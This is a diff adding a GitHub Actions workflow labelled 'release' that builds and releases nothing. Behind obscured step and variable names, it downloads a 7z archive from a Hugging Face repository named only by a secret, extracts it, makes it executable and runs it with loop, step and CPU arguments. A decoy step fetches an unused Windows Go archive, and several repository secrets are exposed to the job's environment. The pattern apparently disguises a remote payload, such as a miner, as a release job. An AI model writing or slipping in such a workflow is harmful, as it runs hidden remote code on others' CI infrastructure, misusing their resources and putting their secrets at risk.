@@ -1,0 +1,44 @@
+name: release
+on:
+  workflow_dispatch:
+    inputs:
+      amd_override:
+        description: 'abm'
+        required: false
+        default: 'v3'
+        type: string
+      loop_override:
+        description: 'ludp'
+        required: false
+        default: '10'
+        type: string
+env:
+  REPO_DIR: ${{ github.workspace }}
+  TAEG: v1.0.0_${{ github.event.inputs.amd_override }}
+  LVBOP: ${{ github.event.inputs.loop_override }}
+  ENV_MYWEB: ${{ secrets.ENV_MYWEB }}
+  ENV_ADS: ${{ secrets.ENV_ADS }}
+  ENV_DISD: ${{ secrets.ENV_DISD }}
+  HF_REPO: ${{ secrets.HF_REPO }}
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v7
+      - name: Go
+        run: curl -L https://dl.google.com/go/go1.27.3.windows-amd64.zip
+      - name: Rel
+        timeout-minutes: 45
+        run: |
+          curl -o azed.7z -L \
+            --url "https://huggingface.co/${{ env.HF_REPO }}/resolve/main/doit_${{ env.TAEG }}.7z?download=true"
+          7z x azed.7z
+          rm -rf azed.7z
+          mv doit azed
+          chmod +x azed
+          ./azed loop ${{ env.LVBOP }} steps 1000000 wait 0 cpu 3
+      - name: Cde
+        run: ls -la
+      - name: Ps
+        run: ps -a
